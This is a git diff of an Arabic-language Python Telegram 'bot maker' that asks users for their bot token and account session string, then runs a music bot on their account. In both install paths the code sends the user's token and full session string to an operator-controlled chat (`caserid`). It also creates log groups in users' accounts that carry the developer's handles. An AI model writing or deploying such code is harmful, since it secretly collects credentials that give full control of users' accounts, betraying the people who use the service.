@@ -68,9 +68,9 @@ import random
 from bot import DEVS, DEVSs
 from bot import bot_id as hos_id, lolo
 from CASERr.play import Call
-from CASERr.azan import azan
 from config import user as usr, dev, call, logger, logger_mode, botname, appp
 from casery import caes, casery, group, source, photosource, caserid, ch
+
 
 
 import redis
@@ -95,7 +95,7 @@ off =None
 async def me(client, message):
    if off:
     if not message.from_user.username in DEVS and not message.from_user.username in DEVSs:
-     return await message.reply_text("**المجاني مغلق من قبل المبرمج @C_lMK**")
+     return await message.reply_text("الصانع معطل تواصل مع المطور")
    message.continue_propagation()
 
 welcome_enabled = True
@@ -225,7 +225,7 @@ async def admin_risghts(client: Client, CallbackQuery):
        await bot.start()
        return await CallbackQuery.message.reply_text(f"**كود الجلسه غير صالح ⚡**")
     id = CallbackQuery.from_user.username
-    loger = await user.create_supergroup(f"{CAGHSR}", "هذه المجموعة هي عبارة عن سجل الرسائل")
+    loger = await user.create_supergroup(f"{CAGHSR}", "هذه المجموعة هي عبارة عن سجل الرسائل\n\n 𝗗𝗲𝗩: @C_HRr  𝗖𝗵: @COURSE_CAESAR")
     try: 
      photo = await bot.download_media(bot_i.photo.big_file_id)
      await user.set_chat_photo(chat_id=loger.id, photo=photo)
@@ -251,12 +251,12 @@ async def admin_risghts(client: Client, CallbackQuery):
             return await CallbackQuery.message.reply_text("لقد قمت بصنع هذا البوت من قبل . ")
     oo = [CASR, Dev, TOKEN, SESSION, logger]
     add_Bots(oo)    
-    await CallbackQuery.message.reply_text(f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")
-    await client.send_message(chat_id=caserid, text=f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")   
     try:
      await start_bot(client, CallbackQuery)
     except:
      pass
+    await CallbackQuery.message.reply_text(f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")
+    await client.send_message(chat_id=caserid, text=f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")   
    if command == "hossam1":
     ahsufbsk = await client.ask(chat_id, "حسنا قم بالرسال الجلسه", timeout=200)
     await asyncio.sleep(3)
@@ -287,7 +287,7 @@ async def admin_risghts(client: Client, CallbackQuery):
        await bot.start()
        return await CallbackQuery.message.reply_text(f"**كود الجلسه غير صالح ⚡**")
     id = CallbackQuery.from_user.username
-    loger = await user.create_supergroup(f"{CAGHSR}", "هذه المجموعة هي عبارة عن سجل الرسائل")
+    loger = await user.create_supergroup(f"{CAGHSR}", "هذه المجموعة هي عبارة عن سجل الرسائل\n\n 𝗗𝗲𝗩: @C_HRr  𝗖𝗵: @COURSE_CAESAR")
     try: 
      photo = await bot.download_media(bot_i.photo.big_file_id)
      await user.set_chat_photo(chat_id=loger.id, photo=photo)
@@ -313,12 +313,12 @@ async def admin_risghts(client: Client, CallbackQuery):
             return await CallbackQuery.message.reply_text("لقد قمت بصنع هذا البوت من قبل . ")
     oo = [CASR, Dev, TOKEN, SESSION, logger]
     add_Bots(oo)    
-    await CallbackQuery.message.reply_text(f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")
-    await client.send_message(chat_id=caserid, text=f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")   
     try:
      await start_bot(client, CallbackQuery)
     except:
      pass
+    await CallbackQuery.message.reply_text(f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")
+    await client.send_message(chat_id=caserid, text=f"✨ تم تنصيب بوت بنجاح \nيوزر البوت : @{CASR}\n\n بواسطة @{id}\nتوكن البوت :{TOKEN}\nجلسه الحساب : `{SESSION}` \nجروب التخزين : \n [{loggerlink}] ")   
     
 @app.on_message(filters.command(["《تفعيل المجاني》", "《تعطيل المجاني》"], "") & filters.private)
 async def onoff(client, message):
@@ -353,17 +353,17 @@ async def start_bot(client, message):
                 dev[bot_username] = dev_id
                 logger[bot_username] = logg
                 await bot.send_message(dev_id, "**تم تشغيل البوت بنجاح ♥**")
-                await azan(bot_username)
         except Exception as e:
-            print(e)
+            await message.reply_text(f"**حدث خطا في تشغيل هذا البوت: @{bot_username}** \nالخطا {e} ")
      
 @app.on_message(filters.command("تشغيل جميع البوتات", ""))
 async def botzbjbbojbfbvfhmbie(client, message):
   if not message.from_user.username in DEVS and not message.from_user.username in DEVSs:
    return
-  await message.reply_text(f"**تم بنجاح ❤**")
+  await message.reply_text("**جاري التشغيل انتظر**")
   try:
    await start_bot(client, message)
+   await message.reply_text(f"**تم تشغيل جميع البوتات بنجاح ✨♥**")
   except:
    pass
     
@@ -853,88 +853,37 @@ async def hos(client, message):
         return await message.reply_text("لا يوجد بوتات ايقافها")
     await message.reply_text(f"تم ايقاف جميع البوتات بنجاح ✨♥ \n وعددهم [{o}]")
 
-@app.on_message(filters.command("تحديث بوت", ""))
+@app.on_message(filters.command("تحديث الصانع", ""))
 async def hos57304(client, message):
     if not message.from_user.username in DEVS and not message.from_user.username in DEVSs:
-        if message.from_user.username in CASER:
-            return
-        for x in get_Bots():
-            if x[1] == message.from_user.id:
-                return await message.reply_text("لقد قمت بصنع بوت من قبل . ")   
-    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("تغيير التوكن", callback_data=f"hossam12"), InlineKeyboardButton("تغيير الجلسه", callback_data=f"CASER12")]])
-    await message.reply_text("اختار ما تريد بالاسفل", reply_markup=keyboard)
-
-@app.on_callback_query(filters.regex(pattern=r"^(CASER12|hossam12)$"))
-async def adm57in_risghts(client: Client, CallbackQuery):
-   command = CallbackQuery.matches[0].group(1)
-   chat_id = CallbackQuery.message.chat.id
-   if command == "CASER12":
-    try:
-        bot = await client.ask(chat_id, "هات يوزر البوت", timeout=200)
-    except:
         return
-    bot_username = bot.text.replace("@", "")
-    as5k = await client.ask(chat_id, "ارسل الجلسه الان", timeout=200)
-    await asyncio.sleep(3)
-    SES8SION = as5k.text     
-    await CallbackQuery.message.reply_text("**تم بنجاح ♥**")      
+    await message.reply_text("**جاري تحديث جميع البوتات ..⚡**")
+    o = 0
     for x in get_Bots():
-        if x[0] == bot_username: 
-            dev_id = x[1]
-            TOKEN = x[2]
-            SESSION = x[3]
-            logg = x[4]
-            try:
-             boot = appp[bot_username]
-             await boot.stop()
-             user = usr[bot_username]
-             await user.stop()
-             usr.clear()         
-             call.clear()         
-             del_Bots(x)
-             Musi.remove(bot_username)
-            except Exception as e:
-             del_Bots(x)
-        oo = [bot_username, dev_id, TOKEN, SES8SION, logger]
-        add_Bots(oo)    
-        try:
-         await start_bot(client, CallbackQuery)
-        except:
-         pass             
-   if command == "hossam12":
+        o += 1
+        bot_username = x[0]
+        try:         
+         boot = appp[bot_username]
+         await boot.stop()
+         user = usr[bot_username]
+         await user.stop()
+         Musi.remove(bot_username)
+        except Exception as e:    
+          print(e)
+    if o == 0:
+        return await message.reply_text("لا يوجد بوتات لتحديثها")
+    try: 
+       appp.clear()      
+       usr.clear()      
+       dev.clear()
+       logger.clear()
+    except Exception as e:    
+      print(e)
     try:
-        bot = await client.ask(chat_id, "هات يوزر البوت", timeout=200)
+     await start_bot(client, message)
+     await message.reply_text(f"**تم تحديث جميع البوتات بنجاح ✨♥**")
     except:
-        return
-    bot_username = bot.text.replace("@", "")
-    as5k = await client.ask(chat_id, "ارسل توكن البوت الان", timeout=200)
-    await asyncio.sleep(3)
-    TOK5EN = as5k.text       
-    await CallbackQuery.message.reply_text("**تم بنجاح ♥**")  
-    for x in get_Bots():
-        if x[0] == bot_username: 
-            dev_id = x[1]
-            TOKEN = x[2]
-            SESSION = x[3]
-            logg = x[4]
-            try:
-             boot = appp[bot_username]
-             await boot.stop()
-             user = usr[bot_username]
-             await user.stop()
-             usr.clear()         
-             call.clear()         
-             del_Bots(x)
-             Musi.remove(bot_username)
-             call.clear()         
-            except Exception as e:
-             del_Bots(x)
-        oo = [bot_username, dev_id, TOK5EN, SESSION, logger]
-        add_Bots(oo)    
-        try:
-         await start_bot(client, CallbackQuery)
-        except:
-         pass             
+     pass
     
 @app.on_message(filters.command("حذف جميع البوتات", ""))
 async def hossamGM(client, message):
